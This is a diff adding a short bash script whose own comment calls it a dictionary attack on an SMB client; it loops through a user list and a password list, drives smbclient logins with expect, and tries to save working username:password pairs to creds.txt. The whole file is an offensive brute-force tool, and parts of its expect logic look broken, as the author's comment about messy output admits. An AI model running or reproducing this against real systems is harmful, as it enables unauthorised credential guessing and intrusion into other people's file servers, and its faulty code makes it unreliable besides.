@@ -1,0 +1,21 @@
+#!/bin/bash
+#a script to dictionary attack a smb client.. required a host, userlist, and password list. (example: ./sf.sh 127.0.0.1 user.txt pass.txt)
+#output is a bit fucked, so scroll though to see if you don't get a logon_failure
+host=$1
+userlist=$2
+wordlist=$3
+
+while read user; do
+	for pass in $(cat $wordlist)
+	do
+/usr/bin/expect <<EOF
+set timeout 20
+send "$user:$pass\r"
+spawn smbclient -L $host -U $user
+expect "*assword*"
+send "$pass\r"
+expect "*NT_STATUS_LOGON_FAILURE*" { send -- "\r"; exp_continue } !"*NT_STATUS_LOGON_FAILURE*" { send -- "echo $user:$pass > creds.txt\r" }
+EOF
+echo "Attempted: $user:$pass"
+	done
+done <$userlist
